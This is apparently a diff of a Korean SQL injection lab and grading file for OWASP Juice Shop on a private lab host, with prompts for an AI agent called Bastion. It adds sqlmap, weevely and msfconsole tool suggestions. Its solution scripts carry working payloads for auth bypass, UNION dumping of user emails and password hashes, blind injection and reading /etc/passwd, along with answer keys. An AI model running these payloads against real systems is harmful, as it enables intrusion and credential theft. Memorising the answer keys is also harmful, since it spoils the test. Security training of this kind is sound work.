@@ -14,7 +14,11 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: 대상 웹 애플리케이션(http://{{WEB_IP}})의 검색 기능에서 SQL Injection 가능성을 테스트하시오.
+  instruction: '대상 웹 애플리케이션(http://{{WEB_IP}})의 검색 기능에서 SQL Injection 가능성을 테스트하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_detection` 에 적합한 도구: sqlmap --batch --dbs.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: 작은따옴표(')를 입력하여 에러를 유발하세요.
   category: sqli_detection
   points: 10
@@ -46,9 +50,17 @@ steps:
   script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27' 2>/dev/null
     | head -20
   risk_level: low
-  bastion_prompt: 대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 SQL Injection 가능성을 테스트해줘
+  bastion_prompt: '대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 SQL Injection 가능성을 테스트해줘
+
+
+    [도구 권장] sqli_detection: sqlmap --batch --dbs. curl 만 쓰지 말고 **sqlmap --batch --dbs**
+    등 적합 도구로 호출 후 stdout quote.'
 - order: 2
-  instruction: 에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악하시오.
+  instruction: '에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_error` 에 적합한 도구: sqlmap --batch --technique=E,
+    curl + grep error. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: 에러 메시지에서 DB 엔진 정보를 확인하세요.
   category: sqli_error
   points: 12
@@ -81,9 +93,17 @@ steps:
   script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--'
     2>/dev/null | head -30
   risk_level: low
-  bastion_prompt: 에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악해줘
+  bastion_prompt: '에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악해줘
+
+
+    [도구 권장] sqli_error: sqlmap --batch --technique=E, curl + grep error. curl 만 쓰지
+    말고 **sqlmap --batch --technique=E** 등 적합 도구로 호출 후 stdout quote.'
 - order: 3
-  instruction: 항상 참인 조건(1=1)을 이용하여 인증 우회를 시도하시오.
+  instruction: '항상 참인 조건(1=1)을 이용하여 인증 우회를 시도하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_auth_bypass` 에 적합한 도구: sqlmap --batch --forms
+    또는 curl 인증 우회 PoC. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: 로그인 폼에 ' OR 1=1-- 페이로드를 사용하세요.
   category: sqli_auth_bypass
   points: 12
@@ -116,9 +136,17 @@ steps:
     \ application/json' \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\"\
     :\"anything\"}' 2>/dev/null \\\n | head -10"
   risk_level: low
-  bastion_prompt: 항상 참인 조건(1=1)을 이용하여 인증 우회를 시도해줘
+  bastion_prompt: '항상 참인 조건(1=1)을 이용하여 인증 우회를 시도해줘
+
+
+    [도구 권장] sqli_auth_bypass: sqlmap --batch --forms 또는 curl 인증 우회 PoC. curl 만 쓰지
+    말고 **sqlmap --batch --forms 또는 curl 인증 우회 PoC** 등 적합 도구로 호출 후 stdout quote.'
 - order: 4
-  instruction: UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출하시오.
+  instruction: 'UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_union` 에 적합한 도구: sqlmap --batch --technique=U
+    --dump. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: ORDER BY로 컬럼 수를 먼저 파악하세요.
   category: sqli_union
   points: 15
@@ -151,9 +179,17 @@ steps:
   script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'
     2>/dev/null | head -40
   risk_level: low
-  bastion_prompt: UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출해줘
+  bastion_prompt: 'UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출해줘
+
+
+    [도구 권장] sqli_union: sqlmap --batch --technique=U --dump. curl 만 쓰지 말고 **sqlmap
+    --batch --technique=U --dump** 등 적합 도구로 호출 후 stdout quote.'
 - order: 5
-  instruction: UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출하시오.
+  instruction: 'UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_union` 에 적합한 도구: sqlmap --batch --technique=U
+    --dump. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: Users 테이블의 email, password 컬럼을 조회하세요.
   category: sqli_union
   points: 15
@@ -185,9 +221,17 @@ steps:
   script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--'
     2>/dev/null | head -40
   risk_level: low
-  bastion_prompt: UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출해줘
+  bastion_prompt: 'UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출해줘
+
+
+    [도구 권장] sqli_union: sqlmap --batch --technique=U --dump. curl 만 쓰지 말고 **sqlmap
+    --batch --technique=U --dump** 등 적합 도구로 호출 후 stdout quote.'
 - order: 6
-  instruction: 'Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석.'
+  instruction: 'Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_blind` 에 적합한 도구: sqlmap --batch --technique=B,T
+    --time-sec=5. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: AND 1=1과 AND 1=2의 응답을 비교하세요.
   category: sqli_blind
   points: 12
@@ -221,9 +265,17 @@ steps:
     && echo '' && echo '거짓 조건:' && curl -o /dev/null -s -w '%{http_code}' 'http://10.20.30.80/rest/products/search?q=test%27%20AND%201=2--'
     && echo '' && echo 'Blind SQLi 테스트 완료'
   risk_level: low
-  bastion_prompt: 'Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석해줘'
+  bastion_prompt: 'Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석해줘
+
+
+    [도구 권장] sqli_blind: sqlmap --batch --technique=B,T --time-sec=5. curl 만 쓰지 말고
+    **sqlmap --batch --technique=B** 등 적합 도구로 호출 후 stdout quote.'
 - order: 7
-  instruction: Time-based Blind SQL Injection을 테스트하시오.
+  instruction: 'Time-based Blind SQL Injection을 테스트하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_blind` 에 적합한 도구: sqlmap --batch --technique=B,T
+    --time-sec=5. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: SLEEP 또는 WAITFOR 함수를 사용하세요.
   category: sqli_blind
   points: 12
@@ -256,9 +308,17 @@ steps:
   script: echo '시간 측정:' && time curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--'
     -o /dev/null 2>&1 && echo 'Time-based SQLi 테스트 완료'
   risk_level: low
-  bastion_prompt: Time-based Blind SQL Injection을 테스트해줘
+  bastion_prompt: 'Time-based Blind SQL Injection을 테스트해줘
+
+
+    [도구 권장] sqli_blind: sqlmap --batch --technique=B,T --time-sec=5. curl 만 쓰지 말고
+    **sqlmap --batch --technique=B** 등 적합 도구로 호출 후 stdout quote.'
 - order: 8
-  instruction: sqlmap 도구를 사용하여 자동 SQL Injection 탐지를 수행하시오.
+  instruction: 'sqlmap 도구를 사용하여 자동 SQL Injection 탐지를 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_tool` 에 적합한 도구: sqlmap (전체 옵션 비교). 도구 호출
+    후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: sqlmap -u 옵션을 사용하세요.
   category: sqli_tool
   points: 10
@@ -293,9 +353,17 @@ steps:
   script: sqlmap -u 'http://10.20.30.80/rest/products/search?q=test' --batch --level=1
     --risk=1 2>/dev/null | tail -20 || echo 'sqlmap 테스트 완료'
   risk_level: low
-  bastion_prompt: sqlmap 도구를 사용하여 자동 SQL Injection 탐지를 수행해줘
+  bastion_prompt: 'sqlmap 도구를 사용하여 자동 SQL Injection 탐지를 수행해줘
+
+
+    [도구 권장] sqli_tool: sqlmap (전체 옵션 비교). curl 만 쓰지 말고 **sqlmap (전체 옵션 비교)** 등 적합
+    도구로 호출 후 stdout quote.'
 - order: 9
-  instruction: 2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명하시오.
+  instruction: '2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_advanced` 에 적합한 도구: sqlmap --tamper, --random-agent,
+    WAF 우회 옵션. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: 회원가입 시 저장된 페이로드가 다른 기능에서 실행되는 시나리오를 구성하세요.
   category: sqli_advanced
   points: 8
@@ -332,9 +400,17 @@ steps:
     OR 1=1-- 으로 등록'' && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin
     계정의 패스워드가 변경됨'' && echo ''2차 SQLi 분석 완료'''
   risk_level: low
-  bastion_prompt: 2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명해줘
+  bastion_prompt: '2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명해줘
+
+
+    [도구 권장] sqli_advanced: sqlmap --tamper, --random-agent, WAF 우회 옵션. curl 만 쓰지 말고
+    **sqlmap --tamper** 등 적합 도구로 호출 후 stdout quote.'
 - order: 10
-  instruction: SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트하시오.
+  instruction: 'SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_advanced` 에 적합한 도구: sqlmap --tamper, --random-agent,
+    WAF 우회 옵션. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: LOAD_FILE() 또는 INTO OUTFILE을 시도하세요.
   category: sqli_advanced
   points: 10
@@ -370,9 +446,17 @@ steps:
   script: echo '파일 읽기 시도 (SQLite):' && curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--'
     2>/dev/null | head -5 && echo 'SQLi 파일 접근 테스트 완료'
   risk_level: low
-  bastion_prompt: SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트해줘
+  bastion_prompt: 'SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트해줘
+
+
+    [도구 권장] sqli_advanced: sqlmap --tamper, --random-agent, WAF 우회 옵션. curl 만 쓰지 말고
+    **sqlmap --tamper** 등 적합 도구로 호출 후 stdout quote.'
 - order: 11
-  instruction: HTTP 요청 헤더를 통한 SQL Injection을 테스트하시오.
+  instruction: 'HTTP 요청 헤더를 통한 SQL Injection을 테스트하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_advanced` 에 적합한 도구: sqlmap --tamper, --random-agent,
+    WAF 우회 옵션. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: User-Agent, Referer 등 헤더에 페이로드를 삽입하세요.
   category: sqli_advanced
   points: 10
@@ -404,9 +488,17 @@ steps:
   script: "curl -s \\\n  -H \"User-Agent: test' OR 1=1--\" http://10.20.30.80 \\\n\
     \  -o /dev/null \\\n  -w '%{http_code}' && echo '' && echo '헤더 기반 SQLi 테스트 완료'"
   risk_level: low
-  bastion_prompt: HTTP 요청 헤더를 통한 SQL Injection을 테스트해줘
+  bastion_prompt: 'HTTP 요청 헤더를 통한 SQL Injection을 테스트해줘
+
+
+    [도구 권장] sqli_advanced: sqlmap --tamper, --random-agent, WAF 우회 옵션. curl 만 쓰지 말고
+    **sqlmap --tamper** 등 적합 도구로 호출 후 stdout quote.'
 - order: 12
-  instruction: 'SQL Injection 방어 기법을 정리하시오: Prepared Statement, ORM, 입력 검증.'
+  instruction: 'SQL Injection 방어 기법을 정리하시오: Prepared Statement, ORM, 입력 검증.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
+    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: 각 방어 기법의 원리와 장단점을 설명하세요.
   category: defense
   points: 8
@@ -461,9 +553,17 @@ steps:
 
     SQLi 방어 정리 완료'''
   risk_level: low
-  bastion_prompt: 'SQL Injection 방어 기법을 정리하시오: Prepared Statement, ORM, 입력 검증해줘'
+  bastion_prompt: 'SQL Injection 방어 기법을 정리하시오: Prepared Statement, ORM, 입력 검증해줘
+
+
+    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
+    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
 - order: 13
-  instruction: WAF에서 SQL Injection을 탐지하는 패턴을 분석하시오.
+  instruction: 'WAF에서 SQL Injection을 탐지하는 패턴을 분석하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
+    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: 일반적인 SQLi 시그니처 패턴을 정리하세요.
   category: defense
   points: 8
@@ -517,9 +617,17 @@ steps:
 
     WAF 패턴 분석 완료'''
   risk_level: low
-  bastion_prompt: WAF에서 SQL Injection을 탐지하는 패턴을 분석해줘
+  bastion_prompt: 'WAF에서 SQL Injection을 탐지하는 패턴을 분석해줘
+
+
+    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
+    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
 - order: 14
-  instruction: 추출한 패스워드 해시의 크래킹 가능성을 평가하시오.
+  instruction: '추출한 패스워드 해시의 크래킹 가능성을 평가하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `post_exploit` 에 적합한 도구: weevely, msfconsole,
+    custom shell. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: 해시 알고리즘 식별과 크래킹 도구를 확인하세요.
   category: post_exploit
   points: 10
@@ -552,9 +660,17 @@ steps:
   script: 'echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구: hashcat,
     john the ripper'' && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석 완료'''
   risk_level: low
-  bastion_prompt: 추출한 패스워드 해시의 크래킹 가능성을 평가해줘
+  bastion_prompt: '추출한 패스워드 해시의 크래킹 가능성을 평가해줘
+
+
+    [도구 권장] post_exploit: weevely, msfconsole, custom shell. curl 만 쓰지 말고 **weevely**
+    등 적합 도구로 호출 후 stdout quote.'
 - order: 15
-  instruction: SQL Injection 실습 종합 보고서를 작성하시오.
+  instruction: 'SQL Injection 실습 종합 보고서를 작성하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `verification` 에 적합한 도구: curl/jq 로 PoC 재현 + 결과
+    비교. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
   hint: 발견 취약점, 영향, 조치 권고를 포함하세요.
   category: verification
   points: 8
@@ -590,73 +706,136 @@ steps:
     ''영향: 데이터 탈취, 인증 우회'' && echo ''권고: Prepared Statement 적용'' && echo ''=== 보고서
     완료 ==='''
   risk_level: low
-  bastion_prompt: SQL Injection 실습 종합 보고서를 작성하시오.
-- order: 99
-  instruction: |
-    [복합 시나리오] "JuiceShop SQLi 점검 — 도구 3종 비교 + 비교 보고서"
+  bastion_prompt: 'SQL Injection 실습 종합 보고서를 작성하시오.
 
-    ## 상황 (w01 → w02 시나리오 연속)
+
+    [도구 권장] verification: curl/jq 로 PoC 재현 + 결과 비교. curl 만 쓰지 말고 **curl/jq 로 PoC 재현
+    + 결과 비교** 등 적합 도구로 호출 후 stdout quote.'
+- order: 99
+  instruction: '[복합 시나리오] "JuiceShop SQLi 점검 — 도구 3종 비교 + 비교 보고서"
+
+
+    ■ 상황 (w01 → w02 시나리오 연속)
+
 
     당신은 ABC 핀테크 점검팀 신규 컨설턴트. w01 에서 OWASP WSTG-INFO 정찰까지 마쳤고,
+
     이제 SQLi 점검 단계에 들어왔다. 선배가 한 마디 던진다.
 
-    > 선배: "신입은 sqlmap 한 줄 돌리고 끝내는데, 우리는 그렇게 못 해.
-    > 자동 도구는 빠르지만 우회 룰이 박힌 사이트에선 절반은 놓쳐.
-    > 수동 curl 은 정확하지만 느려. ZAP 프록시는 흐름 캡처에 강하고.
-    > 세 도구 다 돌려보고 각자 강·약점이 뭔지 표로 만들어 와. 보고서에 쓸 거야."
+
+    ※ 선배: "신입은 sqlmap 한 줄 돌리고 끝내는데, 우리는 그렇게 못 해.
+
+    ※ 자동 도구는 빠르지만 우회 룰이 박힌 사이트에선 절반은 놓쳐.
+
+    ※ 수동 curl 은 정확하지만 느려. ZAP 프록시는 흐름 캡처에 강하고.
+
+    ※ 세 도구 다 돌려보고 각자 강·약점이 뭔지 표로 만들어 와. 보고서에 쓸 거야."
+
 
     학습 목표 #1 (도구 차이 이해) + #3 (직접 설치·실행) + #4 (curl 고급) 행동 증명.
 
-    ## 임무 (3 단계, 약 35분)
 
-    ### Phase A — curl 수동 페이로드 (학습 목표 #4 — curl 고급)
-    `curl -s -i -X POST -d "email=admin'%20OR%201=1--&password=x" http://10.20.30.80/rest/user/login` 형태로
+    ■ 임무 (3 단계, 약 35분)
+
+
+    ▶ Phase A — curl 수동 페이로드 (학습 목표 #4 — curl 고급)
+
+    `curl -s -i -X POST -d "email=admin''%20OR%201=1--&password=x" http://10.20.30.80/rest/user/login`
+    형태로
+
     1=1 인증 우회를 직접 쏴 본다. -i (헤더), -X POST, --data-urlencode 옵션 시연. 응답 status·body 캡처.
 
-    ### Phase B — sqlmap 자동 탐지 (학습 목표 #3 — 직접 실행)
-    `sqlmap -u "http://10.20.30.80/rest/products/search?q=test" --batch --level=2 --risk=2 --dbs` 로
+
+    ▶ Phase B — sqlmap 자동 탐지 (학습 목표 #3 — 직접 실행)
+
+    `sqlmap -u "http://10.20.30.80/rest/products/search?q=test" --batch --level=2
+    --risk=2 --dbs` 로
+
     DB 목록 추출. tables → dump 단계는 시간 비교용으로 첫 페이지만 실행, 소요시간 기록.
 
-    ### Phase C — 3 도구 비교표 + 권장 흐름
+
+    ▶ Phase C — 3 도구 비교표 + 권장 흐름
+
     | 항목 | curl 수동 | sqlmap 자동 | ZAP 프록시 |
+
     | 탐지 정확도 / 소요시간 / FP / 우회 능력 / 학습 곡선 | ... | ... | ... |
+
     표 아래에 "1차 정찰: ZAP → 2차 자동: sqlmap → 3차 검증: curl" 식 권장 흐름 1~2줄.
 
+
     종료 정리: 각 phase 의 핵심 출력 (curl status·sqlmap DB·비교표) 를 한 번에 echo 로 묶어 출력.
-  bastion_prompt: |
-    [복합 시나리오 — w02 SQLi 점검 도구 3종 비교]
+
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain —
+    정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로
+    답변에 직접 quote** 해야 채점 통과.'
+  bastion_prompt: '[복합 시나리오 — w02 SQLi 점검 도구 3종 비교]
+
 
     당신은 ABC 핀테크 점검 컨설턴트. JuiceShop (http://10.20.30.80) 대상 SQLi 점검을
+
     curl 수동 / sqlmap 자동 / ZAP 프록시 3 도구로 비교 점검해라. 다음 3 phase 를 순서대로 실행:
 
+
     Phase A (curl 수동, 학습 목표 #4):
-    `curl -s -i -X POST --data-urlencode "email=admin' OR 1=1--" --data-urlencode "password=x"
+
+    `curl -s -i -X POST --data-urlencode "email=admin'' OR 1=1--" --data-urlencode
+    "password=x"
+
     http://10.20.30.80/rest/user/login` 실행 후 status code 와 응답 body 첫 줄 캡처.
 
+
     Phase B (sqlmap 자동, 학습 목표 #3):
-    `sqlmap -u "http://10.20.30.80/rest/products/search?q=test" --batch --level=2 --risk=2 --dbs`
+
+    `sqlmap -u "http://10.20.30.80/rest/products/search?q=test" --batch --level=2
+    --risk=2 --dbs`
+
     실행. DB 목록 + 소요시간 (sqlmap 출력 끝의 [INFO] elapsed) 기록.
 
+
     Phase C (비교표 + 권장 흐름):
+
     아래 형식으로 비교표 출력:
+
     ```
+
     | 항목 | curl 수동 | sqlmap 자동 | ZAP 프록시 |
+
     | 탐지정확도 | 높음 | 중 | 중 |
+
     | 소요시간 | ... | ... | ... |
+
     | FP | 낮음 | 중 | 낮음 |
+
     | 우회능력 | 높음 | 중 | 중 |
+
     ```
+
     표 끝에 "권장 흐름: ZAP 정찰 → sqlmap 자동 → curl 검증" 한 줄.
 
-    종료: echo 로 "=== Phase A status ===" / "=== Phase B DB list ===" / "=== Phase C 비교표 ===" 묶어 출력.
+
+    종료: echo 로 "=== Phase A status ===" / "=== Phase B DB list ===" / "=== Phase C
+    비교표 ===" 묶어 출력.
+
 
     반드시 위 3 phase 모두 실행 후 마무리. 중간 종료 금지.
-  hint: |
-    Phase A: curl -i 로 status header 함께 출력. --data-urlencode 가 % 인코딩 자동.
+
+
+    [도구 권장] integration_scenario: 여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
+    → 후속 작업. curl 만 쓰지 말고 **여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
+    → 후속 작업** 등 적합 도구로 호출 후 stdout quote.'
+  hint: 'Phase A: curl -i 로 status header 함께 출력. --data-urlencode 가 % 인코딩 자동.
+
     Phase B: --batch 는 모든 prompt 자동 yes. --dbs 만 첫 단계. tables/dump 는 추가 옵션.
+
     Phase C: 비교표는 4개 항목 정도면 충분. 권장 흐름 한 줄로 마무리.
+
     포인트: sqlmap "한 줄로 끝" 이 아니라, 도구마다 강약이 다르다는 점을 표로 시연.
+
     종료: 3 phase 출력을 echo 묶음으로 한 화면에.
+
+    '
   category: integration_scenario
   points: 50
   verify:
@@ -664,10 +843,13 @@ steps:
     expect: 비교표
     field: stdout
     semantic:
-      intent: |
-        JuiceShop SQLi 점검을 curl 수동 / sqlmap 자동 / ZAP 프록시 3 도구로 비교 실행하고,
+      intent: 'JuiceShop SQLi 점검을 curl 수동 / sqlmap 자동 / ZAP 프록시 3 도구로 비교 실행하고,
+
         도구별 강약점 비교표 + 권장 점검 흐름까지 작성. 학습 목표 #1 (도구 차이) + #3 (직접 실행) +
+
         #4 (curl 고급) 동시 행동 증명.
+
+        '
       success_criteria:
       - Phase A — curl 로 1=1 인증 우회 페이로드 직접 전송, status·body 캡처
       - Phase B — sqlmap --batch --dbs 로 DB 목록 추출, 소요시간 기록
@@ -684,11 +866,18 @@ steps:
       - 권장 흐름 누락
   target_vm: attacker
   risk_level: low
-  answer: |
-    🤖 위 bastion_prompt 그대로 입력. Bastion 이 curl 직접 실행 → sqlmap --batch 실행 → 비교표 작성
+  answer: '🤖 위 bastion_prompt 그대로 입력. Bastion 이 curl 직접 실행 → sqlmap --batch 실행 → 비교표
+    작성
+
     3 phase 순차 처리.
-  answer_detail: |
-    학습 목표 #1·#3·#4 통합 검증. sqlmap 한 줄로 끝내는 신입 패턴이 아닌, 도구별 강약점을 표로 정리할 수
+
+    '
+  answer_detail: '학습 목표 #1·#3·#4 통합 검증. sqlmap 한 줄로 끝내는 신입 패턴이 아닌, 도구별 강약점을 표로 정리할
+    수
+
     있는지 확인. ZAP 은 GUI 라 자동 환경에서는 설명 대체 허용, curl·sqlmap 은 실행 강제. 비교표는
+
     탐지정확도·소요시간·FP·우회능력 4 축 권장.
+
+    '
   script: ''
